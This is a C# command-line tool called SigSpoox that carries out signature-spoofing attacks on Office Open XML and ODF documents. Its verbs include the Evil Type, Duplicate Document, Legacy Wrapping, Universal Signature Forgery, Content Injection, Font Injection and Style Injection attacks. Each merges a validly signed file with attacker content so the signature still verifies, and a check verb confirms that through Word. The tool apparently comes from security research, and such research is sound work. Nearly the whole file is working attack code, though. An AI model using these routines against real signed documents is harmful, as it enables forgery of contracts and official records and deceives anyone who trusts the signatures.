// external dependencies
using CommandLine;
using OpenMcdf;

using System.IO.Compression;
using System.Xml.Linq;
using System.Text;
using Word = Microsoft.Office.Interop.Word;
using Microsoft.Office.Interop.Word;
using Microsoft.Office.Core;

public static class SigSpoox
    {
        [Verb("eta", HelpText = "Perform the Evil Type Attack")]
        public class EtaOptions
        {
            [Option('s', "signed-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("dda", HelpText = "Perform the Duplicate Document Attack")]
        public class DdaOptions
        {
            [Option('s', "signed-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("lwa-excel", HelpText = "Perform the Legacy Wrapping Attack (Excel)")]
        public class LwaExcelOptions
        {
            [Option('s', "signed-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("lwa-word-prepare", HelpText = "Prepare the Legacy Wrapping Attack (Word)")]
        public class LwaWordPrepOptions
        {
            [Option('s', "signed-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("lwa-word-final", HelpText = "Perform the Legacy Wrapping Attack (Word)")]
        public class LwaWordFinalOptions
        {
            [Option('s', "signed-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("usf", HelpText = "Perform the Universal Signature Forgery Attack")]
        public class UsfOptions
        {
            [Option('s', "signature-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("cia", HelpText = "Perform the Content Injection Attack")]
        public class CiaOptions
        {
            [Option('s', "signature-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("fia-word-prepare", HelpText = "Prepare the Font Injection Attack")]
        public class FiaWordPrepOptions
        {
            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("fia-word-final", HelpText = "Finalize the Font Injection Attack")]
        public class FiaWordFinalOptions
        {
            [Option('s', "signature-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("sia-word-prepare", HelpText = "Prepare the Style Injection Attack")]
        public class SiaWordPrepOptions
        {
            [Option('a', "attacker-file", Required = true, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }

        [Verb("sia-word-final", HelpText = "Finalize the Style Injection Attack")]
        public class SiaWordFinalOptions
        {
            [Option('s', "signature-file", Required = true, HelpText = "signed document")]
            public string SignedFile { get; set; }

            [Option('a', "attacker-file", Required = false, HelpText = "attacker document")]
            public string AttackerFile { get; set; }

            [Option('r', "result-file", Required = true, HelpText = "result document")]
            public string ResultFile { get; set; }
        }


        [Verb("check", HelpText = "Checks if the testvectors are successfully validated by the XML signature parser")]
        public class CheckOptions
        {

        }

        public static void Main(string[] args)
        {
            CommandLine.Parser.Default.ParseArguments<EtaOptions, DdaOptions, LwaExcelOptions, LwaWordPrepOptions,
                LwaWordFinalOptions, UsfOptions, CiaOptions, FiaWordPrepOptions, FiaWordFinalOptions, SiaWordPrepOptions, SiaWordFinalOptions, CheckOptions>(args)
            .MapResult(
              (EtaOptions opts) => ETA(opts),
              (DdaOptions opts) => DDA(opts),
              (LwaExcelOptions opts) => LWAExcel(opts),
              (LwaWordPrepOptions opts) => LWAWordPrep(opts),
              (LwaWordFinalOptions opts) => LWAWordFinal(opts),
              (UsfOptions opts) => USF(opts),
              (CiaOptions opts) => CIA(opts),
              (FiaWordPrepOptions opts) => FiaWordPrep(opts),
              (FiaWordFinalOptions opts) => FiaWordFinal(opts),
              (SiaWordPrepOptions opts) => SiaWordPrep(opts),
              (SiaWordFinalOptions opts) => SiaWordFinal(opts),
              (CheckOptions opts) => checkSignatures(),
              errs => 1);
        }

        public static (string, string, string, string) CreateTempDirs()
        {
            string Tmpdir = Directory.CreateDirectory(Path.GetTempPath() + Path.GetRandomFileName()).ToString();
            string SignedTmpdir = Path.Combine(Tmpdir, "signed");
            string AttackerTmpdir = Path.Combine(Tmpdir, "attacker");
            string ResultTmpdir = Path.Combine(Tmpdir, "result");

            Directory.CreateDirectory(SignedTmpdir);
            Directory.CreateDirectory(AttackerTmpdir);
            Directory.CreateDirectory(ResultTmpdir);

            return (Tmpdir, SignedTmpdir, AttackerTmpdir, ResultTmpdir);
        }


        public static int ETA(EtaOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);

            CopyDirectory(SignedTmpdir, ResultTmpdir);
            CopyDirectory(Path.Join(AttackerTmpdir, "word"), Path.Join(ResultTmpdir, "word"));

            XDocument XDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"[Content_Types].xml"));
            var ContentTypes = from element in XDoc.Root.Elements()
                               from attribute in element.Attributes()
                               where attribute.Name == "PartName" && attribute.Value.StartsWith("/word/")
                               select element;

            XDocument XDoc2 = XDocument.Load(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), LoadOptions.PreserveWhitespace);
            XDoc2.Root.Add(ContentTypes);
            XDoc2.Save(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), SaveOptions.DisableFormatting);

            XDocument relDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"_rels/.rels"));

            var Relationship = (from relationship in relDoc.Root.Elements()
                                from attribute in relationship.Attributes()
                                where attribute.Name == "Target" && attribute.Value == @"word/document.xml"
                                select relationship).First();
            Relationship.SetAttributeValue("Id", "rId11");

            XDocument relDocT = XDocument.Load(Path.Combine(ResultTmpdir, @"_rels/.rels"), LoadOptions.PreserveWhitespace);
            relDocT.Root.AddFirst(Relationship);
            relDocT.Save(Path.Combine(ResultTmpdir, @"_rels/.rels"), SaveOptions.DisableFormatting);

            File.Delete(opts.ResultFile);
            CreateZip(ResultTmpdir, opts.ResultFile);

            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int DDA(DdaOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);

            CopyDirectory(SignedTmpdir, ResultTmpdir);
            CopyDirectory(Path.Join(AttackerTmpdir, "word"), Path.Join(ResultTmpdir, "word2"));

            XDocument XDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"[Content_Types].xml"));
            var ContentTypes = (from element in XDoc.Root.Elements()
                                from attribute in element.Attributes()
                                where attribute.Name == "PartName" && attribute.Value.StartsWith("/word/")
                                select element).ToList();

            foreach (XElement ContentType in ContentTypes)
            {
                ContentType.Attribute("PartName").SetValue(ContentType.Attribute("PartName").Value.Replace("/word/", "/word2/"));
            }

            XDocument XDoc2 = XDocument.Load(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), LoadOptions.PreserveWhitespace);
            XDoc2.Root.Add(ContentTypes);
            XDoc2.Save(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), SaveOptions.DisableFormatting);

            XDocument relDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"_rels/.rels"));

            var Relationship = (from relationship in relDoc.Root.Elements()
                                from attribute in relationship.Attributes()
                                where attribute.Name == "Target" && attribute.Value == @"word/document.xml"
                                select relationship).First();
            Relationship.SetAttributeValue("Id", "rId11");
            Relationship.SetAttributeValue("Target", Relationship.Attribute("Target").Value.Replace("word/", "word2/"));

            XDocument relDocT = XDocument.Load(Path.Combine(ResultTmpdir, @"_rels/.rels"), LoadOptions.PreserveWhitespace);
            relDocT.Root.AddFirst(Relationship);
            relDocT.Save(Path.Combine(ResultTmpdir, @"_rels/.rels"), SaveOptions.DisableFormatting);

            File.Delete(opts.ResultFile);
            CreateZip(ResultTmpdir, opts.ResultFile);

            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int LWAExcel(LwaExcelOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);

            CopyDirectory(AttackerTmpdir, ResultTmpdir);

            string ContentTypesString = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/content-types""><Default Extension=""sigs"" ContentType=""application/vnd.openxmlformats-package.digital-signature-origin""/><Override PartName=""/_xmlsignatures/sig1.xml"" ContentType=""application/vnd.openxmlformats-package.digital-signature-xmlsignature+xml""/><Override PartName=""/Workbook"" ContentType=""application/octet-stream""/></Dummy>";
            XElement ContentTypes = XElement.Parse(ContentTypesString);

            XDocument XDoc2 = XDocument.Load(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), LoadOptions.PreserveWhitespace);
            XDoc2.Root.Add(ContentTypes.Elements());
            XDoc2.Save(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), SaveOptions.DisableFormatting);

            string RelationshipString = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId4"" Type=""http://schemas.openxmlformats.org/package/2006/relationships/digital-signature/origin"" Target=""_xmlsignatures/origin.sigs""/></Dummy>";
            XElement RelationshipToInsert = XElement.Parse(RelationshipString);

            XDocument relDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"_rels/.rels"));

            XDocument relDocT = XDocument.Load(Path.Combine(ResultTmpdir, @"_rels/.rels"), LoadOptions.PreserveWhitespace);
            relDocT.Root.Add(RelationshipToInsert.Elements());
            relDocT.Save(Path.Combine(ResultTmpdir, @"_rels/.rels"), SaveOptions.DisableFormatting);


            // openmcdf has no easy way to extract the signature file which has a random ID each time
            byte[] file = File.ReadAllBytes(opts.SignedFile);
            string signatureStartPattern = @"<?xml version=""1.0"" encoding=""UTF-8""?><Signature";
            string signatureEndPattern = @"</Object></Signature>";
            (int signatureStartPos, _) = findBytePattern(file, Encoding.ASCII.GetBytes(signatureStartPattern));
            (_, int signatureEndPos) = findBytePattern(file, Encoding.ASCII.GetBytes(signatureEndPattern), signatureStartPos + signatureStartPattern.Length);
            byte[] signature = file.Skip(signatureStartPos).Take(signatureEndPos - signatureStartPos).ToArray();

            CompoundFile cf = new CompoundFile(opts.SignedFile);
            CFStream foundStream = cf.RootStorage.GetStream("Workbook");
            byte[] Workbook = foundStream.GetData();
            cf.Close();

            byte[] signaturePattern = { 0x5c, 0x00, 0x70, 0x00 };
            (int signaturePatternStart, _) = findBytePattern(Workbook, signaturePattern);
            int offset = signaturePatternStart + signaturePattern.Length;

            byte[] signedPart = Workbook.Take(offset).Concat(Workbook.Skip(offset + 112)).ToArray();
            File.WriteAllBytes(Path.Join(ResultTmpdir, "Workbook"), signedPart);
            Directory.CreateDirectory(Path.Join(ResultTmpdir, "_xmlsignatures", "_rels"));
            File.WriteAllBytes(Path.Join(ResultTmpdir, "_xmlsignatures", "sig1.xml"), signature);
            File.Create(Path.Join(ResultTmpdir, "_xmlsignatures", "origin.sigs")).Dispose();
            string OriginSigsRels = @"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/package/2006/relationships/digital-signature/signature"" Target=""sig1.xml""/></Relationships>";
            File.WriteAllText(Path.Join(ResultTmpdir, "_xmlsignatures", "_rels", "origin.sigs.rels"), OriginSigsRels);

            File.Delete(opts.ResultFile);
            CreateZip(ResultTmpdir, opts.ResultFile);

            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int LWAWordFinal(LwaWordFinalOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);

            CopyDirectory(AttackerTmpdir, ResultTmpdir);

            string ContentTypesString = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/content-types""><Default Extension=""sigs"" ContentType=""application/vnd.openxmlformats-package.digital-signature-origin""/><Override PartName=""/_xmlsignatures/sig1.xml"" ContentType=""application/vnd.openxmlformats-package.digital-signature-xmlsignature+xml""/><Override PartName=""/Data"" ContentType=""application/octet-stream""/><Override PartName=""/1Table"" ContentType=""application/octet-stream""/><Override PartName=""/ACompObj"" ContentType=""application/octet-stream""/><Override PartName=""/WordDocument"" ContentType=""application/octet-stream""/></Dummy>";
            XElement ContentTypes = XElement.Parse(ContentTypesString);

            XDocument XDoc2 = XDocument.Load(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), LoadOptions.PreserveWhitespace);
            XDoc2.Root.Add(ContentTypes.Elements());
            XDoc2.Save(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), SaveOptions.DisableFormatting);

            string RelationshipString = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId4"" Type=""http://schemas.openxmlformats.org/package/2006/relationships/digital-signature/origin"" Target=""_xmlsignatures/origin.sigs""/></Dummy>";
            XElement RelationshipToInsert = XElement.Parse(RelationshipString);

            XDocument relDoc = XDocument.Load(Path.Combine(AttackerTmpdir, @"_rels/.rels"));

            XDocument relDocT = XDocument.Load(Path.Combine(ResultTmpdir, @"_rels/.rels"), LoadOptions.PreserveWhitespace);
            relDocT.Root.Add(RelationshipToInsert.Elements());
            relDocT.Save(Path.Combine(ResultTmpdir, @"_rels/.rels"), SaveOptions.DisableFormatting);


            // openmcdf has no easy way to extract the signature file which has a random ID each time
            byte[] file = File.ReadAllBytes(opts.SignedFile);
            string signatureStartPattern = @"<?xml version=""1.0"" encoding=""UTF-8""?><Signature";
            string signatureEndPattern = @"</Object></Signature>";
            (int signatureStartPos, _) = findBytePattern(file, Encoding.ASCII.GetBytes(signatureStartPattern));
            (_, int signatureEndPos) = findBytePattern(file, Encoding.ASCII.GetBytes(signatureEndPattern), signatureStartPos + signatureStartPattern.Length);
            byte[] signature = file.Skip(signatureStartPos).Take(signatureEndPos - signatureStartPos).ToArray();

            string[] streams = { "Data", "1Table", "ACompObj", "WordDocument" };
            CompoundFile cf = new CompoundFile(opts.SignedFile);
            foreach (string stream in streams)
            {
                CFStream foundStream = cf.RootStorage.GetStream(stream);
                byte[] streamData = foundStream.GetData();
                File.WriteAllBytes(Path.Join(ResultTmpdir, stream), streamData);
            }
            cf.Close();

            Directory.CreateDirectory(Path.Join(ResultTmpdir, "_xmlsignatures", "_rels"));
            File.WriteAllBytes(Path.Join(ResultTmpdir, "_xmlsignatures", "sig1.xml"), signature);
            File.Create(Path.Join(ResultTmpdir, "_xmlsignatures", "origin.sigs")).Dispose();
            string OriginSigsRels = @"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/package/2006/relationships/digital-signature/signature"" Target=""sig1.xml""/></Relationships>";
            File.WriteAllText(Path.Join(ResultTmpdir, "_xmlsignatures", "_rels", "origin.sigs.rels"), OriginSigsRels);

            File.Delete(opts.ResultFile);
            CreateZip(ResultTmpdir, opts.ResultFile);

            Directory.Delete(Tmpdir, true);
            return 0;
        }


        public static int LWAWordPrep(LwaWordPrepOptions opts)
        {
            byte[] file = File.ReadAllBytes(opts.SignedFile);
            // 01CompObj (UTF16-LE)
            byte[] signature = { 0x01, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x70, 0x00, 0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00 };
            (int offset, _) = findBytePattern(file, signature);
            file[offset] = 0x41;
            File.WriteAllBytes(opts.ResultFile, file);
            return 0;
        }

        public static int USF(UsfOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);

            // we just have to copy over SignedInfo, SignatureValue, and KeyInfo which are direct children of Signature
            // if there are some internal references those would have to be included as well

            CopyDirectory(AttackerTmpdir, ResultTmpdir);

            XDocument wordSignature = XDocument.Load(Path.Combine(AttackerTmpdir, @"_xmlsignatures/sig1.xml"));
            XDocument odtSignature = XDocument.Load(Path.Combine(SignedTmpdir, @"META-INF\documentsignatures.xml"), LoadOptions.PreserveWhitespace);

            XNamespace xmlns = "http://www.w3.org/2000/09/xmldsig#";

            XElement odtSignatureElement = odtSignature.Root.Elements().First();
            XElement odtSignedInfo = odtSignatureElement.Element(xmlns + "SignedInfo");
            XElement odtSignatureValue = odtSignatureElement.Element(xmlns + "SignatureValue");
            XElement odtKeyInfo = odtSignatureElement.Element(xmlns + "KeyInfo");


            // in case of a ODF signature we also have to copy over:
            // last 2 reference elements which refer to two signature-internal elements
            // copy those 2 referred elements
            XElement odtSignatureTimestamp = (from ele in odtSignatureElement.Descendants()
                                 from attribute in ele.Attributes()
                                 where attribute.Name == "Id" && attribute.Value.StartsWith("ID")
                                 select ele).First().Parent.Parent;


            XNamespace etsi = "http://uri.etsi.org/01903/v1.3.2#";

            XElement wordQualifyingProperties = (from ele in wordSignature.Descendants()
                                    where ele.Name == etsi + "QualifyingProperties"
                                    select ele).First().Parent;

            wordSignature.Root.Element(xmlns + "SignedInfo").ReplaceWith(odtSignedInfo);
            wordSignature.Root.Element(xmlns + "SignatureValue").ReplaceWith(odtSignatureValue);
            wordSignature.Root.Element(xmlns + "KeyInfo").ReplaceWith(odtKeyInfo);
            wordSignature.Root.Add(odtSignatureTimestamp);
            wordQualifyingProperties.Remove();

            var odtQualifyingPropertiesSet = (from ele in odtSignatureElement.Descendants()
                                          where ele.Name == etsi + "QualifyingProperties"
                                          select ele);

            bool odtQualifyingPropertiesExist = odtQualifyingPropertiesSet.Any();

            // the odt signature is an AdES Signature
            // we have to add the QualifyingProperties Element
            if (odtQualifyingPropertiesExist)
            {
                XElement odtQualifyingProperties = (from ele in odtSignatureElement.Descendants()
                                                    where ele.Name == etsi + "QualifyingProperties"
                                                    select ele).First().Parent;


                wordSignature.Root.Add(odtQualifyingProperties);
            }


            wordSignature.Save(Path.Combine(ResultTmpdir, @"_xmlsignatures/sig1.xml"), SaveOptions.DisableFormatting);

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);

            return 0;
        }

        public static int CIA(CiaOptions opts)
        {
            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);
            CopyDirectory(SignedTmpdir, ResultTmpdir);

            XNamespace w15 = "http://schemas.microsoft.com/office/word/2012/wordml";
            XDocument people = XDocument.Load(Path.Combine(AttackerTmpdir, @"word\document.xml"));
            people.Root.Name = w15 + "people";
            people.Save(Path.Combine(ResultTmpdir, @"word\people.xml"), SaveOptions.DisableFormatting);

            XDocument XDoc = XDocument.Load(Path.Combine(SignedTmpdir, @"[Content_Types].xml"));
            string contentType = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/content-types""><Override PartName = ""/word/people.xml"" ContentType = ""application/vnd.openxmlformats-officedocument.wordprocessingml.people+xml""/></Dummy>";
            XElement type = XElement.Parse(contentType);
            XDoc.Root.Add(type.Elements());
            XDoc.Save(Path.Combine(ResultTmpdir, @"[Content_Types].xml"), SaveOptions.DisableFormatting);

            XDocument docRels = XDocument.Load(Path.Combine(SignedTmpdir, "word/_rels/document.xml.rels"));
            string rel = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id = ""rId6"" Type = ""http://schemas.microsoft.com/office/2011/relationships/people"" Target = ""people.xml""/></Dummy>";
            XElement xRel = XElement.Parse(rel);
            docRels.Root.Add(xRel.Elements());

            docRels.Save(Path.Combine(ResultTmpdir, "word/_rels/document.xml.rels"), SaveOptions.DisableFormatting);

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);

            return 0;
        }

        public static int FiaWordPrep(FiaWordPrepOptions opts)
        {
            //advanced version would
            // remove /word/fonttable.xml
            // remove /word/_rels/fonttable.xml.rels
            // remove /word/fonts/*

            // edit document.xml.rels to exclude fonttable.xml

            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);
            CopyDirectory(AttackerTmpdir, ResultTmpdir);

            XDocument XDoc = XDocument.Load(Path.Join(AttackerTmpdir, "word/_rels/document.xml.rels"));
            XElement del = (from ele in XDoc.Descendants()
                            from attr in ele.Attributes()
                            where attr.Name == "Type" && attr.Value == "http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable"
                            select ele).First();
            del.Remove();
            XDoc.Save(Path.Join(ResultTmpdir, "word/_rels/document.xml.rels"), SaveOptions.DisableFormatting);

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int FiaWordFinal(FiaWordFinalOptions opts)
        {
            // edit document.xml.rels to include fonttable.xml

            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);
            CopyDirectory(SignedTmpdir, ResultTmpdir);

            string rel = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId4"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable"" Target=""fontTable.xml""/></Dummy>";
            XElement fontrel = XElement.Parse(rel);

            XDocument XDoc = XDocument.Load(Path.Join(SignedTmpdir, "word/_rels/document.xml.rels"));
            XDoc.Root.Add(fontrel.Elements());

            XDoc.Save(Path.Join(ResultTmpdir, "word/_rels/document.xml.rels"), SaveOptions.DisableFormatting);

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int SiaWordPrep(SiaWordPrepOptions opts)
        {
            // edit document.xml.rels to exclude styles.xml

            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);
            CopyDirectory(AttackerTmpdir, ResultTmpdir);

            XDocument XDoc = XDocument.Load(Path.Join(AttackerTmpdir, "word/_rels/document.xml.rels"));
            XElement del = (from ele in XDoc.Descendants()
                            from attr in ele.Attributes()
                            where attr.Name == "Type" && attr.Value == "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
                            select ele).First();
            del.Remove();
            XDoc.Save(Path.Join(ResultTmpdir, "word/_rels/document.xml.rels"), SaveOptions.DisableFormatting);

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);
            return 0;
        }

        public static int SiaWordFinal(SiaWordFinalOptions opts)
        {
            // edit document.xml.rels to include styles.xml and add content from document.xml body

            (string Tmpdir, string SignedTmpdir, string AttackerTmpdir, string ResultTmpdir) = CreateTempDirs();
            ZipFile.ExtractToDirectory(opts.SignedFile, SignedTmpdir);


            // optional body content was specified
            if (opts.AttackerFile != null)
            {
                ZipFile.ExtractToDirectory(opts.AttackerFile, AttackerTmpdir);
            }

            CopyDirectory(SignedTmpdir, ResultTmpdir);

            string rel = @"<Dummy xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"" Target=""styles.xml"" /></Dummy>";
            XElement stylerel = XElement.Parse(rel);

            XDocument XDoc = XDocument.Load(Path.Join(SignedTmpdir, "word/_rels/document.xml.rels"));
            XDoc.Root.Add(stylerel.Elements());
            XDoc.Save(Path.Join(ResultTmpdir, "word/_rels/document.xml.rels"), SaveOptions.DisableFormatting);


            // optional body content was specified
            if (opts.AttackerFile != null)
            {
                XNamespace w = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
                XElement body = XDocument.Load(Path.Join(AttackerTmpdir, @"word/document.xml")).Root.Element(w + "body");
                XDocument styles = XDocument.Load(Path.Join(SignedTmpdir, @"word/styles.xml"));
                styles.Root.Add(body);
                styles.Save(Path.Join(ResultTmpdir, @"word/styles.xml"), SaveOptions.DisableFormatting);
            }

            CreateZip(ResultTmpdir, opts.ResultFile);
            Directory.Delete(Tmpdir, true);
            return 0;
        }

        // returns the start and end location of the pattern
        public static (int, int) findBytePattern(byte[] bytes, byte[] pattern, int start = 0)
        {
            // iterate over all possible bytes where the pattern can start
            for (int i = start; i <= (bytes.Length - pattern.Length); i++)
            {
                // found a start, checkSignatures the rest of the bytes
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (bytes[i + j] == pattern[j])
                    {
                        // checkSignatures if we found the complete pattern
                        if (j == (pattern.Length - 1))
                        {
                            return (i, i + pattern.Length);
                        }
                        continue;
                    }
                    else
                    {
                        // bytes do not match, abort scanning this starting position
                        break;
                    }
                }
            }
            Console.WriteLine("Pattern not found!");
            return (-1, -1);
        }

        static void CreateZip(string directory, string result)
        {
            // doesnt throw an exception, so we can always delete, even if the file does not exist
            File.Delete(result);
            ZipFile.CreateFromDirectory(directory, result);

        }

        static void CopyDirectory(string sourceDir, string destinationDir)
        {
            // Get information about the source directory
            var dir = new DirectoryInfo(sourceDir);

            // Check if the source directory exists
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            // Cache directories before we start copying
            DirectoryInfo[] dirs = dir.GetDirectories();

            // Create the destination directory
            Directory.CreateDirectory(destinationDir);

            // Get the files in the source directory and copy to the destination directory
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            // Recursively copy all subdirectories
            foreach (DirectoryInfo subDir in dirs)
            {
                string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                CopyDirectory(subDir.FullName, newDestinationDir);
            }
        }

        public static int checkSignatures()
        {
            Console.WriteLine("Checking if the XML Parser still returns a valid signature for the testvectors");
            IEnumerable<FileInfo> listOfDocx = new DirectoryInfo(@"files\testvectors").GetFiles("*.docx");

            var application = new Word.Application();
            foreach (FileInfo file in listOfDocx)
            {
                Console.Write("Checking " + file.Name + ": ");
                Document document = application.Documents.Open(file.FullName, ReadOnly: true, OpenAndRepair: true);
                SignatureSet sigs = document.Signatures;

                if (sigs.Count == 0)
                {
                    Console.WriteLine("no signatures found");
                    continue;
                }

                Signature sig = sigs[1];
                Console.WriteLine(sig.IsValid);

            }
            application.Quit(SaveChanges: WdSaveOptions.wdDoNotSaveChanges);
            return 0;
        }
    }
